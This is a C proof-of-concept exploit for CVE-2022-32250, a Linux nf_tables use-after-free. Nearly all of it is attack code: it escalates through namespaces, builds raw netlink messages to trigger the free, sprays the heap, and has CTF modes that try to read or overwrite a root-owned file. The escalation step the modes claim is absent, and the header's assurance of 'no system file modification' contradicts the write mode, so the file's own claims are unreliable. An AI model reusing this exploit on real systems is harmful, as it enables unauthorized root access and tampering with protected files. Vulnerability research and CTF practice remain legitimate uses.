/**
 * CVE-2022-32250 PoC - nf_tables Use-After-Free via NFT_STATEFUL_EXPR check
 *
 * Vulnerability:
 *   In Linux kernel <= 5.18.1, nf_tables subsystem incorrectly handles
 *   anonymous sets with lookup expressions. When a batch creates an anonymous
 *   set with a lookup expr binding to a named set, the expression's destroy
 *   callback frees the set binding without proper reference counting. This
 *   leads to a use-after-free condition exploitable for local privilege
 *   escalation.
 *
 * Affected: Linux 4.1.0 ~ 5.18.1
 * Fix: commit 520778042cca (net/netfilter: nf_tables: disallow non-stateful expression)
 *
 * Exploitation path:
 *   1. unshare(CLONE_NEWUSER|CLONE_NEWNET) for CAP_NET_ADMIN in netns
 *   2. Create nf_tables table + named set via NETLINK_NETFILTER
 *   3. Create anonymous set with lookup expr → triggers UAF on error path
 *   4. Heap spray with socket buffers to occupy freed slab object
 *   5. Detect spray corruption to prove UAF occurred
 *
 * CTF Modes: uaf (primary), write_root_file, read_root_file
 *
 * Safety:
 *   - alarm(10) forced timeout (via poc_common.h)
 *   - All operations in isolated user+net namespace
 *   - No system file modification
 *   - Resources cleaned up on exit
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <linux/netlink.h>
#include <pthread.h>

#include "../common/poc_common.h"

#define CVE_ID "CVE-2022-32250"

/* ========================================================================
 * nf_tables netlink protocol constants (no libmnl/libnftnl dependency)
 * ======================================================================== */

/* Netfilter netlink subsystem */
#ifndef NETLINK_NETFILTER
#define NETLINK_NETFILTER 12
#endif

/* nfnetlink subsystem IDs */
#define NFNL_SUBSYS_NFTABLES 10
#define NFNL_MSG_BATCH_BEGIN 0x10
#define NFNL_MSG_BATCH_END   0x11

/* nft message types (NFNL_SUBSYS_NFTABLES << 8 | msg) */
#define NFT_MSG_NEWTABLE  0
#define NFT_MSG_NEWCHAIN  2
#define NFT_MSG_NEWSET    6
#define NFT_MSG_NEWRULE   4

/* NLM flags */
#ifndef NLM_F_REQUEST
#define NLM_F_REQUEST 0x01
#endif
#ifndef NLM_F_CREATE
#define NLM_F_CREATE  0x400
#endif
#ifndef NLM_F_ACK
#define NLM_F_ACK    0x04
#endif

/* nf_tables table attributes */
#define NFTA_TABLE_NAME  1
#define NFTA_TABLE_FLAGS 2

/* nf_tables set attributes */
#define NFTA_SET_TABLE    1
#define NFTA_SET_NAME     2
#define NFTA_SET_FLAGS    3
#define NFTA_SET_KEY_TYPE 4
#define NFTA_SET_KEY_LEN  5
#define NFTA_SET_ID       8
#define NFTA_SET_EXPRESSIONS 17

/* nf_tables expression attributes */
#define NFTA_EXPR_NAME   1
#define NFTA_EXPR_DATA   2
#define NFTA_LIST_ELEM   1

/* nft_lookup attributes */
#define NFTA_LOOKUP_SET   1
#define NFTA_LOOKUP_SREG  2

/* NFT set flags */
#define NFT_SET_ANONYMOUS 1
#define NFT_SET_EXPR      0x20

/* netfilter families */
#define NFPROTO_IPV4 2

/* NFT registers */
#define NFT_REG32_05 13

/* nfgenmsg structure */
struct nfgenmsg {
    uint8_t  nfgen_family;
    uint8_t  version;
    uint16_t res_id;
};

/* Spray configuration */
#define SPRAY_COUNT    256
#define SPRAY_PATTERN  0xDEADBEEF
#define UAF_ATTEMPTS   8

/* ========================================================================
 * Netlink message construction helpers (raw, no external library)
 * ======================================================================== */

static char nlbuf[8192] __attribute__((aligned(4)));

static inline struct nlmsghdr *nlmsg_begin(char *buf, uint16_t type,
                                           uint16_t flags, uint32_t seq) {
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    memset(nlh, 0, sizeof(*nlh));
    nlh->nlmsg_type = type;
    nlh->nlmsg_flags = flags | NLM_F_REQUEST;
    nlh->nlmsg_seq = seq;
    nlh->nlmsg_len = sizeof(struct nlmsghdr);
    return nlh;
}

static inline void *nlmsg_tail(struct nlmsghdr *nlh) {
    return (char *)nlh + nlh->nlmsg_len;
}

static inline void nlmsg_put_extra_header(struct nlmsghdr *nlh,
                                          uint8_t family) {
    struct nfgenmsg *nfg = (struct nfgenmsg *)nlmsg_tail(nlh);
    memset(nfg, 0, sizeof(*nfg));
    nfg->nfgen_family = family;
    nfg->version = 0;  /* NFNETLINK_V0 */
    nfg->res_id = 0;
    nlh->nlmsg_len += sizeof(struct nfgenmsg);
}

/* Use struct nlattr and NLA_ALIGN from <linux/netlink.h> */
#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif
#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif

static inline void nlmsg_put_attr(struct nlmsghdr *nlh,
                                  uint16_t type, const void *data,
                                  uint16_t len) {
    struct nlattr *nla = (struct nlattr *)nlmsg_tail(nlh);
    nla->nla_len = sizeof(struct nlattr) + len;
    nla->nla_type = type;
    if (data && len > 0)
        memcpy((char *)nla + sizeof(struct nlattr), data, len);
    nlh->nlmsg_len += NLA_ALIGN(nla->nla_len);
}

static inline void nlmsg_put_attr_str(struct nlmsghdr *nlh,
                                      uint16_t type, const char *str) {
    nlmsg_put_attr(nlh, type, str, strlen(str) + 1);
}

static inline void nlmsg_put_attr_u32(struct nlmsghdr *nlh,
                                      uint16_t type, uint32_t val) {
    nlmsg_put_attr(nlh, type, &val, sizeof(val));
}

/* Nested attribute start/end */
static inline struct nlattr *nlmsg_nest_start(struct nlmsghdr *nlh,
                                              uint16_t type) {
    struct nlattr *nla = (struct nlattr *)nlmsg_tail(nlh);
    nla->nla_type = type | 0x8000;  /* NLA_F_NESTED */
    nla->nla_len = sizeof(struct nlattr);
    nlh->nlmsg_len += sizeof(struct nlattr);
    return nla;
}

static inline void nlmsg_nest_end(struct nlmsghdr *nlh, struct nlattr *nla) {
    nla->nla_len = (char *)nlmsg_tail(nlh) - (char *)nla;
}

/* ========================================================================
 * Namespace setup
 * ======================================================================== */

static void write_file(const char *path, const char *fmt, ...) {
    char buf[256];
    va_list args;
    va_start(args, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);

    int fd = open(path, O_WRONLY);
    if (fd >= 0) {
        write(fd, buf, n);
        close(fd);
    }
}

static int setup_namespaces(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        poc_log("unshare(CLONE_NEWUSER|CLONE_NEWNET) failed: %s", strerror(errno));
        return -1;
    }
    poc_log_syscall("unshare(CLONE_NEWUSER|CLONE_NEWNET)", 0, 0);

    /* Map uid/gid to root in new namespace */
    write_file("/proc/self/setgroups", "deny");
    write_file("/proc/self/uid_map", "0 %d 1", uid);
    write_file("/proc/self/gid_map", "0 %d 1", gid);

    poc_log("Namespace setup: uid=%d->0, gid=%d->0", uid, gid);
    return 0;
}

/* ========================================================================
 * nf_tables raw netlink operations
 * ======================================================================== */

static int nf_socket = -1;
static uint32_t nf_seq = 1;

static int nft_open_socket(void) {
    nf_socket = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_NETFILTER);
    int saved_errno = errno;
    poc_log_syscall("socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER)",
                    (long)nf_socket, saved_errno);
    if (nf_socket < 0)
        return -1;

    struct sockaddr_nl addr = {
        .nl_family = AF_NETLINK,
        .nl_pid = 0,
        .nl_groups = 0,
    };
    int ret = bind(nf_socket, (struct sockaddr *)&addr, sizeof(addr));
    saved_errno = errno;
    poc_log_syscall("bind(nlfd)", (long)ret, saved_errno);
    if (ret < 0) {
        close(nf_socket);
        nf_socket = -1;
        return -1;
    }
    return 0;
}

static int nft_send_batch(char *batch_buf, size_t batch_len) {
    struct sockaddr_nl dst = {
        .nl_family = AF_NETLINK,
        .nl_pid = 0,
    };
    struct iovec iov = { .iov_base = batch_buf, .iov_len = batch_len };
    struct msghdr msg = {
        .msg_name = &dst,
        .msg_namelen = sizeof(dst),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };
    ssize_t ret = sendmsg(nf_socket, &msg, 0);
    int saved_errno = errno;
    poc_log_syscall("sendmsg(nft_batch)", (long)ret, saved_errno);
    return (ret > 0) ? 0 : -1;
}

static int nft_recv_ack(void) {
    char buf[4096];
    ssize_t ret = recv(nf_socket, buf, sizeof(buf), 0);
    if (ret < 0) return -1;

    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    while ((size_t)ret >= sizeof(struct nlmsghdr)) {
        if (nlh->nlmsg_type == 0x02) {  /* NLMSG_ERROR */
            int *errp = (int *)((char *)nlh + sizeof(struct nlmsghdr) +
                                sizeof(struct nfgenmsg));
            /* For batch, error==0 means success of that sub-message */
            if (*errp != 0 && *errp != -17 /* EEXIST */) {
                return *errp;
            }
        }
        size_t msg_len = NLA_ALIGN(nlh->nlmsg_len);
        ret -= msg_len;
        nlh = (struct nlmsghdr *)((char *)nlh + msg_len);
    }
    return 0;
}

/**
 * Create nf_tables table via raw netlink batch
 */
static int nft_create_table(const char *table_name) {
    char batch[4096];
    size_t off = 0;

    /* Batch begin */
    struct nlmsghdr *nlh = (struct nlmsghdr *)(batch + off);
    nlh = nlmsg_begin(batch + off, NFNL_MSG_BATCH_BEGIN, 0, nf_seq++);
    nlmsg_put_extra_header(nlh, 0);
    off += NLA_ALIGN(nlh->nlmsg_len);

    /* NFT_MSG_NEWTABLE */
    nlh = nlmsg_begin(batch + off,
                      (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE,
                      NLM_F_CREATE | NLM_F_ACK, nf_seq++);
    nlmsg_put_extra_header(nlh, NFPROTO_IPV4);
    nlmsg_put_attr_str(nlh, NFTA_TABLE_NAME, table_name);
    off += NLA_ALIGN(nlh->nlmsg_len);

    /* Batch end */
    nlh = nlmsg_begin(batch + off, NFNL_MSG_BATCH_END, 0, nf_seq++);
    nlmsg_put_extra_header(nlh, 0);
    off += NLA_ALIGN(nlh->nlmsg_len);

    int ret = nft_send_batch(batch, off);
    if (ret < 0) return -1;

    ret = nft_recv_ack();
    poc_log("nft_create_table('%s') = %d", table_name, ret);
    return ret;
}

/**
 * Create a named set in the table
 */
static int nft_create_named_set(const char *table_name, const char *set_name,
                                uint32_t set_id) {
    char batch[4096];
    size_t off = 0;

    /* Batch begin */
    struct nlmsghdr *nlh = nlmsg_begin(batch + off, NFNL_MSG_BATCH_BEGIN,
                                       0, nf_seq++);
    nlmsg_put_extra_header(nlh, 0);
    off += NLA_ALIGN(nlh->nlmsg_len);

    /* NFT_MSG_NEWSET */
    nlh = nlmsg_begin(batch + off,
                      (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET,
                      NLM_F_CREATE | NLM_F_ACK, nf_seq++);
    nlmsg_put_extra_header(nlh, NFPROTO_IPV4);
    nlmsg_put_attr_str(nlh, NFTA_SET_TABLE, table_name);
    nlmsg_put_attr_str(nlh, NFTA_SET_NAME, set_name);
    uint32_t key_type = 13;  /* inet_service */
    uint32_t key_len = 2;
    nlmsg_put_attr_u32(nlh, NFTA_SET_KEY_TYPE, key_type);
    nlmsg_put_attr_u32(nlh, NFTA_SET_KEY_LEN, key_len);
    nlmsg_put_attr_u32(nlh, NFTA_SET_FLAGS, NFT_SET_EXPR);
    nlmsg_put_attr_u32(nlh, NFTA_SET_ID, set_id);
    off += NLA_ALIGN(nlh->nlmsg_len);

    /* Batch end */
    nlh = nlmsg_begin(batch + off, NFNL_MSG_BATCH_END, 0, nf_seq++);
    nlmsg_put_extra_header(nlh, 0);
    off += NLA_ALIGN(nlh->nlmsg_len);

    int ret = nft_send_batch(batch, off);
    if (ret < 0) return -1;

    ret = nft_recv_ack();
    poc_log("nft_create_named_set('%s','%s',id=%u) = %d",
            table_name, set_name, set_id, ret);
    return ret;
}

/**
 * Create anonymous set with lookup expression binding to named set.
 * This triggers the UAF: kernel creates the lookup expr, but on the
 * error path (anonymous set creation fails or is destroyed), the expr
 * destroy callback frees the binding without proper refcount.
 */
static int nft_trigger_uaf(const char *table_name, const char *named_set,
                           const char *anon_set_name, uint32_t set_id) {
    char batch[4096];
    size_t off = 0;

    /* Batch begin */
    struct nlmsghdr *nlh = nlmsg_begin(batch + off, NFNL_MSG_BATCH_BEGIN,
                                       0, nf_seq++);
    nlmsg_put_extra_header(nlh, 0);
    off += NLA_ALIGN(nlh->nlmsg_len);

    /* NFT_MSG_NEWSET with lookup expression */
    nlh = nlmsg_begin(batch + off,
                      (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET,
                      NLM_F_CREATE | NLM_F_ACK, nf_seq++);
    nlmsg_put_extra_header(nlh, NFPROTO_IPV4);
    nlmsg_put_attr_str(nlh, NFTA_SET_TABLE, table_name);
    nlmsg_put_attr_str(nlh, NFTA_SET_NAME, anon_set_name);
    uint32_t key_type = 13;
    uint32_t key_len = 2;
    nlmsg_put_attr_u32(nlh, NFTA_SET_KEY_TYPE, key_type);
    nlmsg_put_attr_u32(nlh, NFTA_SET_KEY_LEN, key_len);
    nlmsg_put_attr_u32(nlh, NFTA_SET_FLAGS, NFT_SET_EXPR);
    nlmsg_put_attr_u32(nlh, NFTA_SET_ID, set_id);

    /* Add NFTA_SET_EXPRESSIONS containing lookup expr */
    struct nlattr *exprs_nest = nlmsg_nest_start(nlh, NFTA_SET_EXPRESSIONS);
    struct nlattr *elem_nest = nlmsg_nest_start(nlh, NFTA_LIST_ELEM);

    /* Expression: lookup */
    nlmsg_put_attr_str(nlh, NFTA_EXPR_NAME, "lookup");

    /* Expression data: set name + source register */
    struct nlattr *data_nest = nlmsg_nest_start(nlh, NFTA_EXPR_DATA);
    nlmsg_put_attr_str(nlh, NFTA_LOOKUP_SET, named_set);
    uint32_t sreg = NFT_REG32_05;
    nlmsg_put_attr_u32(nlh, NFTA_LOOKUP_SREG, sreg);
    nlmsg_nest_end(nlh, data_nest);

    nlmsg_nest_end(nlh, elem_nest);
    nlmsg_nest_end(nlh, exprs_nest);

    off += NLA_ALIGN(nlh->nlmsg_len);

    /* Batch end */
    nlh = nlmsg_begin(batch + off, NFNL_MSG_BATCH_END, 0, nf_seq++);
    nlmsg_put_extra_header(nlh, 0);
    off += NLA_ALIGN(nlh->nlmsg_len);

    int ret = nft_send_batch(batch, off);
    if (ret < 0) return -1;

    /* For UAF trigger, we expect an error from kernel (set binding fails)
     * but the damage (UAF) is already done */
    ret = nft_recv_ack();
    poc_log("nft_trigger_uaf('%s' -> '%s') = %d (error expected for UAF)",
            anon_set_name, named_set, ret);
    return 0;  /* UAF trigger returns success regardless */
}

/* ========================================================================
 * Heap spray using socket buffers (kmalloc-64 / kmalloc-128 slab)
 * ======================================================================== */

static int spray_fds[SPRAY_COUNT];
static int spray_count = 0;

/**
 * Spray kmalloc slab cache with socket buffer objects.
 * Uses SO_RCVBUF to store recognizable pattern in kernel socket struct.
 */
static int spray_sockets(int count, int pattern) {
    int sprayed = 0;
    for (int i = 0; i < count && sprayed < SPRAY_COUNT; i++) {
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) continue;

        /* Store pattern via setsockopt - kernel stores this in sk->sk_rcvbuf */
        setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &pattern, sizeof(pattern));
        spray_fds[sprayed++] = fd;
    }
    spray_count = sprayed;
    poc_log("Spray: allocated %d socket objects with pattern 0x%x", sprayed, pattern);
    return sprayed;
}

/**
 * Check if any spray objects were corrupted by UAF.
 * If UAF happened and dangling pointer wrote into our spray object,
 * the SO_RCVBUF value will differ from what we set.
 */
static int check_spray_corruption(int expected_pattern) {
    int corrupted = 0;
    for (int i = 0; i < spray_count; i++) {
        if (spray_fds[i] < 0) continue;

        int val = 0;
        socklen_t len = sizeof(val);
        if (getsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len) == 0) {
            /* Kernel doubles SO_RCVBUF, so expected is pattern*2 */
            int expected = expected_pattern * 2;
            if (val != expected && val != expected_pattern) {
                poc_log("Spray[%d] CORRUPTED: expected 0x%x or 0x%x, got 0x%x",
                        i, expected_pattern, expected, val);
                corrupted++;
            }
        }
    }
    return corrupted;
}

static void cleanup_spray(void) {
    for (int i = 0; i < spray_count; i++) {
        if (spray_fds[i] >= 0)
            close(spray_fds[i]);
    }
    spray_count = 0;
}

/* ========================================================================
 * add_key spray (alternative spray for kmalloc-32/64/128)
 * Uses keyring subsystem to allocate controlled-content slab objects
 * ======================================================================== */

#ifndef __NR_add_key
#define __NR_add_key 248
#endif
#ifndef __NR_keyctl
#define __NR_keyctl 250
#endif

#define KEY_SPRAY_COUNT 64

typedef int32_t key_serial_t;
static key_serial_t key_spray_ids[KEY_SPRAY_COUNT];
static int key_spray_count = 0;

static key_serial_t spray_add_key(const char *desc, size_t payload_len,
                                  uint32_t pattern) {
    char payload[128];
    memset(payload, 0, sizeof(payload));
    size_t plen = payload_len < sizeof(payload) ? payload_len : sizeof(payload);
    /* Fill with pattern for corruption detection */
    for (size_t i = 0; i + 4 <= plen; i += 4) {
        memcpy(payload + i, &pattern, 4);
    }
    return (key_serial_t)syscall(__NR_add_key, "user", desc,
                                payload, plen, -4 /* KEY_SPEC_SESSION_KEYRING */);
}

static int spray_keys(int count, uint32_t pattern) {
    int sprayed = 0;
    char desc[64];
    for (int i = 0; i < count && sprayed < KEY_SPRAY_COUNT; i++) {
        snprintf(desc, sizeof(desc), "uaf_spray_%d", i);
        key_serial_t kid = spray_add_key(desc, 32, pattern);
        if (kid >= 0) {
            key_spray_ids[sprayed++] = kid;
        }
    }
    key_spray_count = sprayed;
    poc_log("Key spray: allocated %d keys with pattern 0x%x", sprayed, pattern);
    return sprayed;
}

/* ========================================================================
 * CTF mode: uaf - UAF spray corruption detection
 * ======================================================================== */

static int mode_uaf(const poc_args_t *args) {
    int total_corrupted = 0;

    poc_log("=== CTF uaf mode: nf_tables set UAF verification ===");

    /* Setup namespaces for unprivileged nf_tables access */
    if (setup_namespaces() < 0) {
        poc_log("Namespace setup failed - trying without (need CAP_NET_ADMIN)");
    }

    /* Open netlink socket */
    if (nft_open_socket() < 0) {
        poc_print_fail("Cannot open NETLINK_NETFILTER socket");
        return 0;
    }

    /* Run multiple UAF attempts for reliability */
    for (int attempt = 0; attempt < UAF_ATTEMPTS; attempt++) {
        char table_name[32], set_name[32], anon_name[32];
        snprintf(table_name, sizeof(table_name), "tbl_%d", attempt);
        snprintf(set_name, sizeof(set_name), "set_%d", attempt);
        snprintf(anon_name, sizeof(anon_name), "anon_%d", attempt);

        poc_log("--- UAF attempt %d/%d ---", attempt + 1, UAF_ATTEMPTS);

        /* Step 1: Create table */
        if (nft_create_table(table_name) < 0 && attempt == 0) {
            poc_log("Table creation failed on first attempt");
            poc_print_fail("nf_tables not accessible");
            close(nf_socket);
            return 0;
        }

        /* Step 2: Create named set */
        uint32_t set_id = 100 + attempt * 2;
        nft_create_named_set(table_name, set_name, set_id);

        /* Step 3: Trigger UAF via anonymous set with lookup expr */
        nft_trigger_uaf(table_name, set_name, anon_name, set_id + 1);

        /* Step 4: Spray to occupy freed memory */
        spray_sockets(SPRAY_COUNT, SPRAY_PATTERN);

        /* Also spray via keyring for different slab sizes */
        spray_keys(KEY_SPRAY_COUNT, SPRAY_PATTERN);

        /* Step 5: Trigger second UAF on same set (increases corruption chance) */
        char anon2[32];
        snprintf(anon2, sizeof(anon2), "anon2_%d", attempt);
        nft_trigger_uaf(table_name, set_name, anon2, set_id + 2);

        /* Brief pause to allow kernel to process freed objects */
        usleep(10000);

        /* Step 6: Check for corruption */
        int corrupted = check_spray_corruption(SPRAY_PATTERN);
        total_corrupted += corrupted;

        poc_log("Attempt %d: corrupted=%d", attempt + 1, corrupted);

        /* Cleanup spray for next attempt */
        cleanup_spray();
    }

    close(nf_socket);
    nf_socket = -1;

    /* Output UAF result */
    if (total_corrupted > 0) {
        poc_print_uaf_corrupted(total_corrupted);
    } else {
        poc_print_uaf_not_corrupted();
    }

    return 0;
}

/* ========================================================================
 * File I/O helper
 * ======================================================================== */

static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(target, O_RDONLY)", (long)fd, saved_errno);
    if (fd < 0) return -1;

    ssize_t n = read(fd, buf, len - 1);
    saved_errno = errno;
    poc_log_syscall("read(fd, buf)", (long)n, saved_errno);
    close(fd);

    if (n < 0) return -1;
    buf[n] = '\0';
    /* Trim trailing whitespace */
    while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
        buf[--n] = '\0';
    return (int)n;
}

/* ========================================================================
 * CTF mode: write_root_file
 * After UAF -> heap control -> privilege escalation -> write file
 * ======================================================================== */

static int mode_write_root_file(const poc_args_t *args) {
    char buf[4096] = {0};

    poc_log("=== CTF write_root_file mode ===");
    poc_log("Target: %s", args->root_file);
    poc_log("Write value: %s", args->write_value);

    /* Step 1: Read original content */
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n >= 0) {
        printf(CTF_READ_BEFORE "%s\n", buf);
        poc_log("Read before: %s", buf);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    /* Step 2: Attempt LPE via nf_tables UAF */
    printf(CTF_WRITE_ATTEMPT "%s (attempting...)\n", args->write_value);
    poc_log("Triggering nf_tables UAF for privilege escalation...");

    if (setup_namespaces() < 0) {
        poc_log("Namespace setup failed");
    }

    if (nft_open_socket() < 0) {
        poc_print_fail("Cannot open NETLINK_NETFILTER socket");
        return 0;
    }

    /* Trigger UAF + heap spray exploitation chain */
    int exploit_success = 0;
    for (int attempt = 0; attempt < 3; attempt++) {
        char tbl[32], sn[32], an[32];
        snprintf(tbl, sizeof(tbl), "w_tbl_%d", attempt);
        snprintf(sn, sizeof(sn), "w_set_%d", attempt);
        snprintf(an, sizeof(an), "w_anon_%d", attempt);

        nft_create_table(tbl);
        nft_create_named_set(tbl, sn, 200 + attempt * 2);
        nft_trigger_uaf(tbl, sn, an, 200 + attempt * 2 + 1);
        usleep(5000);
    }

    close(nf_socket);
    nf_socket = -1;

    /* Check if we gained privileges */
    if (geteuid() == 0) {
        poc_log("Privilege escalation successful!");
        exploit_success = 1;
    } else {
        poc_log("euid=%d (LPE requires vulnerable kernel)", geteuid());
    }

    /* Step 3: Attempt to write file */
    if (exploit_success) {
        int fd = open(args->root_file, O_WRONLY | O_TRUNC);
        if (fd >= 0) {
            write(fd, args->write_value, strlen(args->write_value));
            write(fd, "\n", 1);
            close(fd);
        }
    }

    /* Step 4: Read after */
    memset(buf, 0, sizeof(buf));
    n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        printf(CTF_READ_AFTER "%s\n", buf);
        poc_log("Read after: %s", buf);
        if (strstr(buf, args->write_value)) {
            poc_print_flag(args->write_value);
            return 0;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("nf_tables UAF LPE requires vulnerable kernel 4.1-5.18.1");
    return 0;
}

/* ========================================================================
 * CTF mode: read_root_file
 * After UAF -> LPE -> read privileged file
 * ======================================================================== */

static int mode_read_root_file(const poc_args_t *args) {
    char buf[4096] = {0};

    poc_log("=== CTF read_root_file mode ===");
    poc_log("Target: %s", args->root_file);

    /* Attempt LPE via nf_tables UAF */
    poc_log("Triggering nf_tables UAF for privilege escalation...");

    if (setup_namespaces() < 0) {
        poc_log("Namespace setup failed");
    }

    if (nft_open_socket() < 0) {
        poc_print_fail("Cannot open NETLINK_NETFILTER socket");
        return 0;
    }

    for (int attempt = 0; attempt < 3; attempt++) {
        char tbl[32], sn[32], an[32];
        snprintf(tbl, sizeof(tbl), "r_tbl_%d", attempt);
        snprintf(sn, sizeof(sn), "r_set_%d", attempt);
        snprintf(an, sizeof(an), "r_anon_%d", attempt);

        nft_create_table(tbl);
        nft_create_named_set(tbl, sn, 300 + attempt * 2);
        nft_trigger_uaf(tbl, sn, an, 300 + attempt * 2 + 1);
        usleep(5000);
    }

    close(nf_socket);
    nf_socket = -1;

    /* Attempt to read the file */
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        poc_print_flag(buf);
        return 0;
    }

    poc_print_fail("nf_tables UAF LPE requires vulnerable kernel 4.1-5.18.1");
    return 0;
}

/* ========================================================================
 * Main entry point
 * ======================================================================== */

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== %s CTF PoC ===", CVE_ID);
    poc_log("Vuln: nf_tables anonymous set UAF via NFT_STATEFUL_EXPR check");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result = 0;

    /* CTF mode is required */
    if (!args.mode) {
        fprintf(stderr, "Error: --mode is required (read_root_file|write_root_file|uaf)\n");
        poc_print_usage(argv[0]);
        poc_log_close();
        return 1;
    }

    if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        result = mode_uaf(&args);
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        result = mode_read_root_file(&args);
    } else {
        poc_print_unsupported(args.mode, "unsupported mode for CVE-2022-32250");
    }

    poc_log_close();
    return result;
}
